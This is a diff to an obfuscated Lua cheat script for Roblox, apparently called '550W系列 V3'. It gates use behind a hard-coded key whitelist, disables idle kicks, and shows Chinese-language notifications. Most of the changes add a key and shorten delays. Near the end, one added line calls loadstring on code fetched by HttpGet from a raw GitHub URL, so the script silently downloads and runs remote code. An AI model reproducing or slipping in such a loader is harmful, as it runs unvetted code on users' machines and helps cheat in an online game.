@@ -29,6 +29,8 @@ if a=="zkosjsiw"then
 _G.whitelist=true
 elseif a=="567yydc"then
 _G.whitelist=true
+elseif a=="po114511"then
+_G.whitelist=true
 elseif a=="Bluewitchme"then
 _G.whitelist=true
 elseif a=="QMQQAQQ"then
@@ -80,7 +82,7 @@ v0:SetCore("SendNotification", {Title="550W系列 V3",Text="申请授权成功�
 wait(2)
 local v0 = game:GetService("StarterGui");
 v0:SetCore("SendNotification", {Title="550W系列 V3",Text="启动完毕",Duration=(1829 - (1195 + 629))});
-wait(2);
+wait(1);
 print("Anti Afk On");
 local v1 = game:GetService("VirtualUser");
 game:GetService("Players").LocalPlayer.Idled:connect(function()
@@ -90,15 +92,15 @@ game:GetService("Players").LocalPlayer.Idled:connect(function()
 end);
 local v0 = game:GetService("StarterGui");
 v0:SetCore("SendNotification", {Title="反挂机已自动开启",Text="被踢出服务器的概率已降低",Duration=5});
-wait(11 - 8);
+wait(1);
 local v0 = game:GetService("StarterGui");
 v0:SetCore("SendNotification", {Title="欢迎来到方舟空间站",Text=("您好" .. game.Players.LocalPlayer.Name .. "，欢迎使用550W系列脚本"),Duration=(1829 - (1195 + 629))});
 local v0 = game:GetService("StarterGui");
 v0:SetCore("SendNotification", {Title="方舟空间站",Text=("您好" .. game.Players.LocalPlayer.Name .. "，欢迎您高级用户"),Duration=(13 - 3)});
-wait(246 - (187 + 54));
+wait(1);
 local v0 = game:GetService("StarterGui");
-v0:SetCore("SendNotification", {Title="『脚本测试者』",Text="『十字架』『tangxianchu』『一头小』『一条鱼』",Duration=(9999)});
-v0:SetCore("SendNotification", {Title="『脚本测试者』",Text="作者师傅：HUA Script制作者",Duration=(9999)});
+v0:SetCore("SendNotification", {Title="『脚本测试者』",Text="『十字架』『tangxianchu』『一头小』『一条鱼』",Duration=(20)});
+v0:SetCore("SendNotification", {Title="『脚本测试者』",Text="作者师傅：HUA Script制作者",Duration=(10)});
 local v2 = Instance.new("ScreenGui", getParent);
 local v3 = Instance.new("TextLabel", getParent);
 local v4 = game.Players.LocalPlayer;
@@ -147,6 +149,7 @@ local function v31()
 		end
 	end
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()
 v29 = tick();
 v27:Connect(v31);
 repeat
